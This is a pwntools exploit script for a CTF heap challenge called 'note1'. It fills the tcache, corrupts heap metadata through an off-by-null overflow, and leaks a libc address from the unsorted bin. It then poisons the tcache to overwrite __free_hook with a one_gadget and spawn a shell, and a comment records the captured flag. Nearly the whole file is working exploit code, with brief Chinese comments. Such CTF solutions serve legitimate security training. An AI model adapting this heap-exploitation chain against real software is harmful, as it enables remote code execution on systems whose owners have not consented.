#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./note1')
libc = ELF('libc.so.6')
# p = remote('chuj.top', '52937')
p=process('./note1')

def create(index, size, content):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('>> ')
    p.sendline(str(index))
    p.recvuntil('>> ')
    p.sendline(str(size))
    p.recvuntil('>> ')
    p.send(content)

def show(index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('>> ')
    p.sendline(str(index))

def delete(index):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('>> ')
    p.sendline(str(index))

def edit(index, content):
    p.recvuntil('>> ')
    p.sendline('4')
    p.recvuntil('>> ')
    p.sendline(str(index))
    p.send(content)

def debug():
    gdb.attach(p)
    pause()

# from pwn import *
# from pwnlib.util.iters import mbruteforce
# import itertools
# import base64
#
# p.recvuntil(') == ')
# hash_code = p.recvuntil('\n', drop=True).decode().strip()
# log.success('hash_code={},'.format(hash_code))
#
# charset = string.printable
# proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')
#
# p.sendlineafter('????> ', proof)

create(0,0xe8,b'a'*1)
create(1,0xe8,b'a'*1)
create(2,0xe8,b'a'*1)
create(3,0xe8,b'a'*1)
create(4,0xe8,b'a'*1)
create(5,0xe8,b'a'*1)
create(6,0xe8,b'a'*1)



create(7,0xe8,b'a'*1)# 7
create(8,0xe8,b'a'*1)# 8
create(9,0x18,b'a'*1)# 9
create(10,0xf8,b'a'*1)# 10

create(11,0xe8,b'a'*1)# 11

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)# 填满 0xf0 的 tcache

create(0,0xf8,b'a'*1)
create(1,0xf8,b'a'*1)
create(2,0xf8,b'a'*1)
create(3,0xf8,b'a'*1)
create(4,0xf8,b'a'*1)
create(5,0xf8,b'a'*1)
create(6,0xf8,b'a'*1)

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)# 填满 0x100 的 tcache



delete(7)# 进 unsorted_bin

payload = b'a'*0x10 + p64(0x200)
edit(9,payload)# 构造 unlink

delete(10)

create(7,0xe8,b'a'*1)
create(7,0xe8,b'a'*1)
create(7,0xe8,b'a'*1)
create(7,0xe8,b'a'*1)
create(7,0xe8,b'a'*1)
create(7,0xe8,b'a'*1)
create(7,0xe8,b'a'*1)

create(7,0xe8,b'a'*1)# unsorted_bin 中拿出 0xf0 大小

show(8)# 此时 8 就是 unsorted_bin 的头顶，直接泄露 libc

unsortedbin_addr = u64(p.recvuntil(b'\n',drop = 'True')[-6:].ljust(8, b'\x00'))
log.success('unsortedbin_addr: ' + hex(unsortedbin_addr))

libc.address = unsortedbin_addr-0x3ebca0
log.success('libc.address: ' + hex(libc.address))

__free_hook_addr = libc.address + 0x3ed8e8
log.success('__free_hook_addr: ' + hex(__free_hook_addr))

one_gadget= [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget_addr = libc.address + one_gadget[1]
log.success('one_gadget_addr: ' + hex(one_gadget_addr))

create(12,0xf8,b'a')
create(12,0xf8,b'a')
create(12,0xf8,b'a')
create(12,0xf8,b'a')
create(12,0xf8,b'a')
create(12,0xf8,b'a')
create(12,0xf8,b'a')


create(12,0xf8,b'a')# unsorted_bin 中拿出 0x100 大小

delete(9)# tcache poisoning


payload = 0xe8*b'a'+p64(0x20) + p64(__free_hook_addr)
edit(12,payload)

create(13,0x18,b'a')

create(13,0x18,p64(one_gadget_addr))

delete(12)


p.interactive()
# hgame{oFF~bY_NUll~c4N-be~RE4LlY~p0WerfuLL!}